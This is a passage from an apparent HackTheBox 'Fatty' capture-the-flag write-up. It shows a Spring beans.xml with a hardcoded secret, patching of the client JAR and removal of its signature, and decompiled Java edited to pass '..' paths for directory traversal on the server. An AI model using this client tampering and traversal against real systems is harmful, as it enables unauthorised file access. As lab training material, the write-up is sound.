</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version = &#34;1.0&#34; encoding = &#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;beans</span> <span class=na>xmlns=</span><span class=s>&#34;http://www.springframework.org/schema/beans&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>xsi:schemaLocation=</span><span class=s>&#34;
</span></span></span><span class=line><span class=cl><span class=s>                http://www.springframework.org/schema/beans
</span></span></span><span class=line><span class=cl><span class=s>                spring-beans-3.0.xsd&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>&lt;!-- Here we have an constructor based injection, where Spring injects required arguments inside the
</span></span></span><span class=line><span class=cl><span class=c>	 constructor function. --&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;bean</span> <span class=na>id=</span><span class=s>&#34;connectionContext&#34;</span> <span class=na>class =</span> <span class=s>&#34;htb.fatty.shared.connection.ConnectionContext&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;constructor-arg</span> <span class=na>index=</span><span class=s>&#34;0&#34;</span> <span class=na>value =</span> <span class=s>&#34;server.fatty.htb&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;constructor-arg</span> <span class=na>index=</span><span class=s>&#34;1&#34;</span> <span class=na>value =</span> <span class=s>&#34;8000&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;/bean&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>&lt;!-- The next to beans use setter injection. For this kind of injection one needs to define an default
</span></span></span><span class=line><span class=cl><span class=c>constructor for the object (no arguments) and one needs to define setter methods for the properties. --&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;bean</span> <span class=na>id=</span><span class=s>&#34;trustedFatty&#34;</span> <span class=na>class =</span> <span class=s>&#34;htb.fatty.shared.connection.TrustedFatty&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;property</span> <span class=na>name =</span> <span class=s>&#34;keystorePath&#34;</span> <span class=na>value =</span> <span class=s>&#34;fatty.p12&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;/bean&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;bean</span> <span class=na>id=</span><span class=s>&#34;secretHolder&#34;</span> <span class=na>class =</span> <span class=s>&#34;htb.fatty.shared.connection.SecretHolder&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;property</span> <span class=na>name =</span> <span class=s>&#34;secret&#34;</span> <span class=na>value =</span> <span class=s>&#34;clarabibiclarabibiclarabibi&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;/bean&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>&lt;!--  For out final bean we use now again constructor injection. Notice that we use now ref instead of val --&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;bean</span> <span class=na>id=</span><span class=s>&#34;connection&#34;</span> <span class=na>class =</span> <span class=s>&#34;htb.fatty.client.connection.Connection&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;constructor-arg</span> <span class=na>index =</span> <span class=s>&#34;0&#34;</span> <span class=na>ref =</span> <span class=s>&#34;connectionContext&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;constructor-arg</span> <span class=na>index =</span> <span class=s>&#34;1&#34;</span> <span class=na>ref =</span> <span class=s>&#34;trustedFatty&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;constructor-arg</span> <span class=na>index =</span> <span class=s>&#34;2&#34;</span> <span class=na>ref =</span> <span class=s>&#34;secretHolder&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;/bean&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;/beans&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s change the port value form <code>8080</code> to <code>1337</code> in <code>beans.xml</code> and then
update the jar archive. We also remove the files used for signature so Java
doesn&rsquo;t complain <code>beans.xml</code> doesn&rsquo;t match the signature anymore.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ jar -uf fatty-client-patched.jar beans.xml
</span></span><span class=line><span class=cl>$ zip -d fatty-client-patched.jar META-INF/1.RSA META-INF/1.SF
</span></span><span class=line><span class=cl>deleting: META-INF/1.SF
</span></span><span class=line><span class=cl>deleting: META-INF/1.RSA
</span></span></code></pre></td></tr></table></div></div><p>Then we can run our patched version <code>java -jar fatty-client-patched.jar</code>.</p><p>But before, we need to add the local domain in our hosts file and to set Java 8.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/hosts | grep fatty
</span></span><span class=line><span class=cl>10.10.10.174 server.fatty.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ archlinux-java set java-8-openjdk
</span></span></code></pre></td></tr></table></div></div><p>Now we can log in and discover the fat client from a user point of view.</p><h2 id=client-discovery>Client discovery<a hidden class=anchor aria-hidden=true href=#client-discovery>#</a></h2><ul><li>Profile<ul><li>Whoami: Γ£à</li><li>ChangePassword: Γ¥î</li></ul></li><li>ServerStatus<ul><li>Uname: Γ¥î</li><li>Users: Γ¥î</li><li>Netstat: Γ¥î</li><li>Ipconfig: Γ¥î</li></ul></li><li>FileBrowser: seems like a <code>ls</code> on a hardcoded folder<ul><li>Configs: Γ£à</li><li>Notes: Γ£à</li><li>Mail: Γ£à</li></ul></li><li>ConnectionTest:<ul><li>Ping: Γ£à</li></ul></li><li>Help<ul><li>Contact: Γ£à</li><li>About: Γ£à</li></ul></li></ul><p>There is also an <code>Open</code> feature that read a file (seems to exclude comments),
it seems it&rsquo;s not possible to do directory traversal but we can <code>cd</code> in the
FileBrowser files and read them.</p><p><code>security.txt</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Since our fatty clients processes sensitive data, we were forced to perform a penetration test on it.
</span></span><span class=line><span class=cl>I had no time to look at the results yet in more detail, but it looks like there are a few criticals.
</span></span><span class=line><span class=cl>We should starting to fix these issues ASAP.
</span></span></code></pre></td></tr></table></div></div><p><code>dave.txt</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Hey qtc,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>until the issues from the current pentest are fixed we have removed all administrative users from the database.
</span></span><span class=line><span class=cl>Your user account is the only one that is left. Since you have only user permissions, this should prevent exploitation
</span></span><span class=line><span class=cl>of the other issues. Furthermore, we implemented a timeout on the login procedure. Time heavy SQL injection attacks are
</span></span><span class=line><span class=cl>therefore no longer possible.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Best regards,
</span></span><span class=line><span class=cl>Dave
</span></span></code></pre></td></tr></table></div></div><h2 id=code-analysis-fatty-client>Code analysis: fatty client<a hidden class=anchor aria-hidden=true href=#code-analysis-fatty-client>#</a></h2><p>With <a href=https://java-decompiler.github.io/>JD-GUI</a> or other decompiler we can decompile the code to read it.
With <code>jar -uf</code> we can easily update a text file like <code>beans.xml</code> but we can&rsquo;t
update code in the JAR because the code is compiled (<code>.class</code>).
Trying to compile our <code>.java</code> won&rsquo;t probably do any good as there are not
the original code but ones obtained through decompilation.
So the best idea is to update the original JAR via a Java bytecode editor.</p><p>I used <a href=https://github.com/Col-E/Recaf>Recaf</a> for that.</p><p><code>htb/fatty/client/gui/ClientGuiTest.java</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>        </span><span class=n>openFileButton</span><span class=p>.</span><span class=na>addActionListener</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ActionListener</span><span class=p>(){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>actionPerformed</span><span class=p>(</span><span class=n>ActionEvent</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>currentFolder</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>controlPanel</span><span class=p>,</span><span class=w> </span><span class=s>&#34;No folder selected! List a directory first!&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>fileName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>fileTextField</span><span class=p>.</span><span class=na>getText</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>fileName</span><span class=p>.</span><span class=na>replaceAll</span><span class=p>(</span><span class=s>&#34;[^a-zA-Z0-9.]&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>invoker</span><span class=p>.</span><span class=na>open</span><span class=p>(</span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>currentFolder</span><span class=p>,</span><span class=w> </span><span class=n>fileName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>MessageBuildException</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>MessageParseException</span><span class=w> </span><span class=n>e1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>controlPanel</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Failure during message building/parsing.&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>controlPanel</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>textPane</span><span class=p>.</span><span class=na>setText</span><span class=p>(</span><span class=n>response</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>});</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>        </span><span class=n>openFileButton</span><span class=p>.</span><span class=na>addActionListener</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ActionListener</span><span class=p>(){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>actionPerformed</span><span class=p>(</span><span class=n>ActionEvent</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>fileName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>fileTextField</span><span class=p>.</span><span class=na>getText</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>invoker</span><span class=p>.</span><span class=na>open</span><span class=p>(</span><span class=s>&#34;..&#34;</span><span class=p>,</span><span class=w> </span><span class=n>fileName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>MessageBuildException</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>MessageParseException</span><span class=w> </span><span class=n>e1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>controlPanel</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Failure during message building/parsing.&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>controlPanel</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>textPane</span><span class=p>.</span><span class=na>setText</span><span class=p>(</span><span class=n>response</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>});</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>But still <code>/opt/fatty/files</code> prefix. Putting <code>/</code> in foldername is filtered server-side
too.</p><p>Too see what&rsquo;s in that folder let&rsquo;s modify the function that list files in one
folder, from:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>configs</span><span class=p>.</span><span class=na>addActionListener</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ActionListener</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>actionPerformed</span><span class=p>(</span><span class=n>ActionEvent</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>currentFolder</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;configs&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>          </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>invoker</span><span class=p>.</span><span class=na>showFiles</span><span class=p>(</span><span class=s>&#34;configs&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>MessageBuildException</span><span class=o>|</span><span class=n>htb</span><span class=p>.</span><span class=na>fatty</span><span class=p>.</span><span class=na>shared</span><span class=p>.</span><span class=na>message</span><span class=p>.</span><span class=na>MessageParseException</span><span class=w> </span><span class=n>e1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>          </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>controlPanel</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Failure during message building/parsing.&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>          </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>controlPanel</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>to:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>configs</span><span class=p>.</span><span class=na>addActionListener</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ActionListener</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>actionPerformed</span><span class=p>(</span><span class=n>ActionEvent</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>currentFolder</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;..&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>          </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>invoker</span><span class=p>.</span><span class=na>showFiles</span><span class=p>(</span><span class=s>&#34;..&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>MessageBuildException</span><span class=o>|</span><span class=n>htb</span><span class=p>.</span><span class=na>fatty</span><span class=p>.</span><span class=na>shared</span><span class=p>.</span><span class=na>message</span><span class=p>.</span><span class=na>MessageParseException</span><span class=w> </span><span class=n>e1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>          </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>controlPanel</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Failure during message building/parsing.&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>          </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>controlPanel</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>So by going to <code>FileBrowser -> Configs</code> we can list what is in <code>/opt/fatty/</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>logs
</span></span><span class=line><span class=cl>tar
</span></span><span class=line><span class=cl>start.sh
</span></span><span class=line><span class=cl>fatty-server.jar
</span></span><span class=line><span class=cl>files
</span></span></code></pre></td></tr></table></div></div><p>We now have the name of the server JAR: <code>fatty-server.jar</code>.</p><p><code>/opt/fatty/start.sh</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1># Unfortunately alpine docker containers seems to have problems with services.</span>
</span></span><span class=line><span class=cl><span class=c1># I tried both, ssh and cron to start via openrc, but non of them worked. Therefore,</span>
</span></span><span class=line><span class=cl><span class=c1># both services are now started as part of the docker startup script.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Start cron service</span>
</span></span><span class=line><span class=cl>crond -b
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Start ssh server</span>
</span></span><span class=line><span class=cl>/usr/sbin/sshd
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Start Java application server</span>
</span></span><span class=line><span class=cl>su - qtc /bin/sh -c <span class=s2>&#34;java -jar /opt/fatty/fatty-server.jar&#34;</span>
